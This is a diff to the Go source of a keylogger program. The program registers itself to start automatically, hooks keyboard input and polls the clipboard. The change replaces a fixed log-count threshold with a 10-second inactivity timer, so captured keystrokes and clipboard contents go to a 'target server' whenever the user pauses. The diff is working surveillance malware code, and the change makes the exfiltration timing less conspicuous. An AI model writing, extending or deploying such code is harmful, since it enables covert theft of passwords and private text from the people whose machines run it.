@@ -36,9 +36,7 @@ const (
 	TypeClipboard KeyType = "CBD"
 	TypeSpecial   KeyType = "SPC"
 
-	// MaxLog controls the sending frequency. Set it to a small value for better demonstrating.
-	// MaxLog = 64
-	MaxLog = 4
+	Interval = 10 * time.Second
 )
 
 type keyLog struct {
@@ -56,6 +54,7 @@ func newKeyLog(keyType KeyType, value string) keyLog {
 }
 
 var keyLogs []keyLog
+var ticker = time.NewTicker(Interval)
 
 func main() {
 	// Register autostart service.
@@ -113,10 +112,11 @@ func listenClipboard() {
 	for {
 		// Read from clipboard.
 		t, _ := clipboard.ReadAll()
-		// If the clipboard is nonempty string or has been changed, log it.
+		// If the clipboard is nonempty string or has been changed, log it and reset ticker.
 		if t != text && t != "" {
 			text = t
 			keyLogs = append(keyLogs, newKeyLog(TypeClipboard, text))
+			ticker.Reset(Interval)
 		}
 	}
 }
@@ -128,7 +128,7 @@ func listenKeyboard() {
 	for ev := range evChan {
 		// hook.Start() listens events including mouse and keyboard actions. Only character keys (letters, numbers,
 		// symbols, space, enter, etc.) will call the hook.KeyDown event, others (ctrl, alt, f1, etc.) will not. Thus,
-		// if detected characters typed, log it.
+		// if detected characters typed, log it and reset ticker.
 		if ev.Kind == hook.KeyDown {
 			// Treat return (\r, enter on keyboard), backspace (\b), and tab (\t) as special keys.
 			switch ev.Keychar {
@@ -154,16 +154,22 @@ func listenKeyboard() {
 					}
 				}
 			}
+			ticker.Reset(Interval)
 		}
 	}
 }
 
-// autoSend detects the length of logs and determines to send.
+// autoSend detects signal from the ticker, then send logs to the target server.
 func autoSend() {
 	for {
-		// When have logged to the thresh, send and clear the recorded logs.
-		if len(keyLogs) >= MaxLog {
-			sendLogs()
+		select {
+		// When there is no operation for a specific time interval, send logs.
+		case <-ticker.C:
+			// Send nonempty logs only.
+			if len(keyLogs) > 0 {
+				sendLogs()
+			}
+			ticker.Reset(Interval)
 		}
 	}
 }
